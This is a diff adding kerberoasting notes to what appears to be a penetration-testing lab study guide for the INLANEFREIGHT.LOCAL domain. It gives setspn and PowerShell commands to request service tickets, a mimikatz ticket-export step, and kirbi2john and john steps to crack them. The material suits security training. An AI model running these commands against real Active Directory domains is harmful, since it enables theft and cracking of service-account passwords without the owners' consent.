@@ -148,9 +148,65 @@ impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
 
 <img width="1894" height="977" alt="image" src="https://github.com/user-attachments/assets/2447936a-0e4d-4603-b3a2-7be2e6957913" />
 
+--------------
 
+### Using Windows for kerberoasting( Semi Manual mode)
 
 --------------
+
+- Using [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) binary
+
+```powershell
+setspn -Q */*
+```
+<img width="912" height="691" alt="image" src="https://github.com/user-attachments/assets/cda09d4f-73a1-428c-8ead-c8033eb85d6c" />
+
+- We will focus on user accounts and ignore the computer accounts returned by the tool. Using powershell to target a single user-:
+
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+- Retrieving all tickets with `setspn.exe`
+
+```powershell
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+
+- Now that they are loaded, retrieve with mimikatz
+
+<img width="768" height="220" alt="image" src="https://github.com/user-attachments/assets/3ed518dd-7e6a-4782-bd5c-a092f58595c4" />
+
+- Commands-:
+
+```mimikatz
+base64 /out::true
+kerberos::list /export
+```
+
+<img width="1012" height="544" alt="image" src="https://github.com/user-attachments/assets/0148115c-b4a8-4686-883f-88ef57d7c849" />
+
+-----------
+
+### Prepping it for cracking
+
+------------
+
+- If base64 encoded, decoded first it base64
+- Then, convert to tickets with `kirbi2john`
+
+<img width="1897" height="865" alt="image" src="https://github.com/user-attachments/assets/2673e520-5ad1-4e24-a2b7-4699bf6e2c20" />
+
+- Crack with `john`
+
+<img width="1317" height="274" alt="image" src="https://github.com/user-attachments/assets/0f587cd6-f7d0-45c9-b550-408d3dfe83e3" />
+
+
+
+
+
+---------------
 
 
 
